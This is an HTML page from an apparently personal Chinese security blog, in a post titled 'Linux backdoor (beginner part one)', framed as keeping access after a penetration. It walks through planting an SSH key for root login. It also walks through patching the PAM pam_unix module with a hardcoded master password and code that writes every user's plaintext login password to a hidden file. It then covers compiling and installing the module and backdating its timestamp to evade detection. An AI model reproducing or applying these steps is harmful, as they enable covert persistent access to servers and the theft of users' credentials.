@@ -1,0 +1,240 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>linux后门(初级篇一) | Leo.Li&#39;s Blog</title>
+  <meta name="author" content="Leo Li">
+
+  
+  <meta name="description" content="blog">
+  
+
+  
+  <meta name="keywords" content="hacked">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="linux后门(初级篇一)">
+  <meta property="og:site_name" content="Leo.Li&#39;s Blog">
+
+  
+  
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="Leo.Li&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Leo.Li&#39;s Blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/tags">标签</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2019-08-17T15:30:34.000Z"><a href="/2019/08/17/Linux后门-初级一/">2019-08-17</a></time>
+      
+      
+  
+    <h1 class="title">linux后门(初级篇一)</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>摘要：后门<br><a id="more"></a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>&emsp;&emsp;渗透测试基本流程。。。权限维持。。。在我看来，这个流程必不可少，而且顺序不能乱，在你拥有权限后做的第一件事可以是信息收集，但也得是为了维持权限的信息收集。个人曾经因为轻敌的态度，没有留后门，等被发现后重新花了将近半个月才能进内网。而且我很幸运，是因为我之前拖到了外网机器的密码。不然。。。血的教训。。。</p>
+<h3 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h3><hr>
+<p>&emsp;&emsp;最简单的两种后门之一。在我看来都不觉得是后门，更像是种便捷登录的方式，对菜鸟运维勉强算个后门吧。  </p>
+<h5 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h5><p>&emsp;&emsp;在源服务器上先生成一份公钥和一份密钥，将公钥复制到目标服务器，利用命令将公钥添加至目标服务器的授权列表(authorized_keys)。当有服务器带着公钥申请连接服务器时，目标服务器首先在authorized_keys中查找是否存在该公钥，如果存在则开始进行验证。首先生成一个随机字符串，利用对应公钥进行加密，然后返回给申请连接的服务器，申请连接服务器利用私钥进行解密，再将字符串返回给目标服务器完成验证，进行后续操作。<br><img src="/2019/08/17/Linux后门-初级一/原理图.png" title="图片1"></p>
+<center>原理图</center>
+
+<h5 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h5><p>&emsp;&emsp;<strong>·</strong> 怎么安装ssh就不谈了。<br>&emsp;&emsp;<strong>·</strong> 创建(.ssh)目录-命令：mkdir /root/.ssh<br>&emsp;&emsp;<strong>·</strong> 在自己的设备上生成ssh公私密钥-命令：ssh-keygen -t rsa 并一直回车，地球不毁灭就不要停。。。<br>&emsp;&emsp;<strong>·</strong> 拷贝自己机器的公钥到目标服务请求的认证文件-命令：<br>&emsp;&emsp;&emsp;&emsp;scp id_rsa.pub username@ip:/root/.ssh<br>&emsp;&emsp;&emsp;&emsp;cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys<br>&emsp;&emsp;<strong>·</strong> 目标服务器的ssh配置文件（/etc/ssh/sshd_config）最好如下，最重要把Pubkey认证打开。<br>&emsp;&emsp;&emsp;&emsp;PermitRootLogin yes<br>&emsp;&emsp;&emsp;&emsp;StrictModes no<br>&emsp;&emsp;&emsp;&emsp;RSAAuthentication yes<br>&emsp;&emsp;&emsp;&emsp;==PubkeyAuthentication yes==  </p>
+<h5 id="3-最终效果"><a href="#3-最终效果" class="headerlink" title="3. 最终效果"></a>3. 最终效果</h5><img src="/2019/08/17/Linux后门-初级一/证书.png" title="图片1">
+<center>证书结果</center>
+
+<h3 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h3><hr>
+<h5 id="1-什么是PAM"><a href="#1-什么是PAM" class="headerlink" title="1. 什么是PAM"></a>1. 什么是PAM</h5><p>&emsp;&emsp;PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。  </p>
+<h5 id="2-原理"><a href="#2-原理" class="headerlink" title="2. 原理"></a>2. 原理</h5><p>&emsp;&emsp;原理什么的请参考<a href="http://www.mamicode.com/info-detail-1429143.html，个人用最简单的话就是更改目标的认证机制（如果目标使用的认证机制不是PAM的话），而这个机制在代码层面有逻辑问题，导致后门的产生。" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1429143.html，个人用最简单的话就是更改目标的认证机制（如果目标使用的认证机制不是PAM的话），而这个机制在代码层面有逻辑问题，导致后门的产生。</a>  </p>
+<h5 id="3-步骤"><a href="#3-步骤" class="headerlink" title="3. 步骤"></a>3. 步骤</h5><p>&emsp;&emsp;<strong>·</strong> 查看系统pam版本：rpm -qa | grep pam<br>&emsp;&emsp;<strong>·</strong> 下载对应版本的pam模块：<a href="http://www.linux-pam.org/library/" target="_blank" rel="noopener">http://www.linux-pam.org/library/</a><br>&emsp;&emsp;<strong>·</strong> 解压&amp;修改pam_unix_auth.c文件  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf Linux-PAM-1.1.1.tar.gz</span><br><span class="line">cd Linux-PAM-1.1.1</span><br><span class="line">cd modules/pam_unix/</span><br><span class="line">vim pam_unix_auth.c</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>·</strong> 修改部分源码<br>&emsp;&emsp;&emsp;&emsp;如下图先定义FILE *fp;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags</span><br><span class="line">                                   ,int argc, const char **argv)</span><br><span class="line">&#123;</span><br><span class="line">        unsigned int ctrl;</span><br><span class="line">        int retval, *ret_data = NULL;</span><br><span class="line">        const char *name;</span><br><span class="line">        const void *p;</span><br><span class="line">        FILE *fp;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;&emsp;&emsp;在retval = _unix_verify_password(pamh, name, p, ctrl); [约177行]下添加  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*password:”redkey”*/</span><br><span class="line">if(strcmp(p,”redkey”)==0)</span><br><span class="line">&#123;</span><br><span class="line">        retval = PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if(retval== PAM_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">/*pamfile:pamwd.txt*/路径随便设置，想简单隐藏前面加个句号</span><br><span class="line">        fp=fopen(“pamwd.txt”,”a”);</span><br><span class="line">        fprintf(fp,”%s::%s\n”,name,p);</span><br><span class="line">        fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>·</strong> 编译  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@redkey pam_unix]# cd ../../</span><br><span class="line">[root@redkey Linux-PAM-1.1.1]# ./configure</span><br><span class="line">[root@redkey Linux-PAM-1.1.1]# make</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>·</strong> 备份原有PAM模块(不想搞破坏就做)  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@redkey security]# mv pam_unix.so&#123;,.bak&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>·</strong> 复制新PAM模块到/lib64/security/目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@redkey security]# cp /root/Linux-PAM-1.1.1/modules/pam_unix/.libs/pam_unix.so /lib64/security/</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<strong>·</strong> 修改pam模块时间属性  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@redkey security]# stat pam_unix.*</span><br><span class="line">  File: &quot;pam_unix.so&quot;</span><br><span class="line">  Size: 151879          Blocks: 304        IO Block: 4096   普通文件</span><br><span class="line">Device: fd01h/64769d    Inode: 565261      Links: 1</span><br><span class="line">Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2013-12-24 11:30:01.813610217 +0800</span><br><span class="line">Modify: 2013-12-24 08:55:00.000000000 +0800</span><br><span class="line">Change: 2013-12-24 11:29:12.747789015 +0800</span><br><span class="line">  File: &quot;pam_unix.so.bak&quot;</span><br><span class="line">  Size: 50752           Blocks: 104        IO Block: 4096   普通文件</span><br><span class="line">Device: fd01h/64769d    Inode: 523660      Links: 1</span><br><span class="line">Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2013-12-24 08:55:08.026835929 +0800</span><br><span class="line">Modify: 2010-02-16 01:34:42.000000000 +0800</span><br><span class="line">Change: 2013-12-24 10:42:11.741663207 +0800</span><br><span class="line">[root@redkey security]# touch -t 201002160134 pam_unix.so</span><br><span class="line">[root@redkey security]# ll pam_unix.*</span><br><span class="line">-rwxr-xr-x  1 root root 151879  2月 16 2010 pam_unix.so</span><br><span class="line">-rwxr-xr-x. 1 root root  50752  2月 16 2010 pam_unix.so.bak</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>·</strong> 结果很遗憾，我明确自己可以记录别人登录时的密码，但是无法使用万能密码，也就是篡改源文件时候的redkey。自己试了很多次，还在研究，为什么说这个简单，认证方式改了动静算很大的了。<br>&emsp;&emsp;<strong>·</strong> 最后vi /etc/ssh/sshd_config，确保UsePAM启用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;&emsp;因为上面篡改的代码只是针对pam_sm_authenticate函数的，为了快速编译而写的，所以还是需要用到pam_unix.so模块，它会把密码与/etc/shadow中的哈希对比。<br>接下来在/etc/pam.d/的对应配置文件首行加入下面两条配置，根据官方说明，按顺序就行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1  Ubuntu位置</span><br><span class="line">2  /etc/pam.d/common-auth-ys</span><br><span class="line">3  CentOS位置</span><br><span class="line">4  /etc/pam.d/sshd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">该添加的代码：</span><br><span class="line">1  auth       required     pam_unix.so</span><br><span class="line">2  auth       required     pam_authx.so</span><br></pre></td></tr></table></figure>
+<h5 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h5><p>&emsp;&emsp;不要轻敌。。。</p>
+<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><p><a href="https://blog.51cto.com/redkey/1343316" target="_blank" rel="noopener">https://blog.51cto.com/redkey/1343316</a><br><a href="https://gorgias.me/2018/03/25/Linux-后渗透笔记-PAM后门" target="_blank" rel="noopener">https://gorgias.me/2018/03/25/Linux-后渗透笔记-PAM后门</a></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/WEB/">WEB</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:blog.youdube.ga">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/APP/">APP</a><small>1</small></li>
+  
+    <li><a href="/categories/WEB/">WEB</a><small>1</small></li>
+  
+    <li><a href="/categories/区块链/">区块链</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2019/08/17/Linux后门-初级一/">linux后门(初级篇一)</a>
+      </li>
+    
+      <li>
+        <a href="/2019/08/17/内部域名/">内部域名</a>
+      </li>
+    
+      <li>
+        <a href="/2019/05/07/上传总结/">上传总结</a>
+      </li>
+    
+      <li>
+        <a href="/2019/04/23/渗透感想/">渗透感想</a>
+      </li>
+    
+      <li>
+        <a href="/2019/02/10/浅析https原理以及过程/">浅析https原理以及过程</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/APP/">APP</a><small>1</small></li>
+  
+    <li><a href="/tags/WEB/">WEB</a><small>5</small></li>
+  
+    <li><a href="/tags/区块链/">区块链</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2019 Leo Li
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
